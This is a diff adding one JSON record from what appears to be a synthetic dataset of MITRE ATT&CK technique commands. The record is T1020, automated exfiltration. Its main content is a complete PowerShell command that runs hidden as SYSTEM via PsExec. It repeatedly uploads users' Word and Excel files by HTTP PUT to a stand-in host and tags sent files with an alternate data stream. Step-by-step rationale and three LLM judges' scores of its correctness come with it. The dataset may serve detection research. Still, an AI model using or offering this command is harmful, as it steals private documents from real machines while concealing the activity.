@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; while ($true){ Get-ChildItem 'C:\\Users\\*\\Documents' -Include *.docx,*.xlsx -Recurse -File | Where-Object { -not (Get-Item -Path $_.FullName -Stream 'exfil' -ErrorAction SilentlyContinue) } | ForEach-Object { try { Invoke-WebRequest -Uri ('https://exfil.example.net/drop/' + $_.Name) -Method Put -InFile $_.FullName -UseBasicParsing | Out-Null; Set-Content -Path $_.FullName -Stream 'exfil' -Value 'sent' -ErrorAction SilentlyContinue } catch {} }; Start-Sleep 900 }\"",
+  "explanation": "Automates exfiltration of office documents via HTTP PUT and tags files with an alternate data stream to prevent re-sending.",
+  "rationale_steps": [
+    "Launch as SYSTEM with PSExec to avoid user prompts and run hidden.",
+    "Recursively enumerate target document types across user folders.",
+    "Upload files using Invoke-WebRequest PUT to a remote drop endpoint.",
+    "Write an 'exfil' ADS marker to each successfully uploaded file.",
+    "Sleep and repeat to maintain ongoing automated exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-2bad4b07",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PsExec and PowerShell arguments are properly formed with balanced quotes/braces, valid flags, and correct separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The loop discovers target files, exfiltrates them via HTTP PUT, and marks them via ADS to avoid re-sending, but running PsExec with -s requires elevated privileges contrary to the 'Privilege: None' context.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T04:49:53.809710Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid flag formats, and appropriate escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements automated exfiltration by using PsExec to launch a hidden PowerShell process that continuously scans for document files, exfiltrates them via HTTP PUT requests, tracks already-exfiltrated files using alternate data streams, and repeats the process every 15 minutes.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T04:49:57.093186Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, valid parameters for all cmdlets, and proper command separation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command expertly implements T1020 Automated Exfiltration by using a scheduled loop to enumerate, filter (via ADS for re-sends), and exfiltrate specific document types via HTTP PUT, leveraging psexec for SYSTEM privileges and stealth.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T04:50:15.510624Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
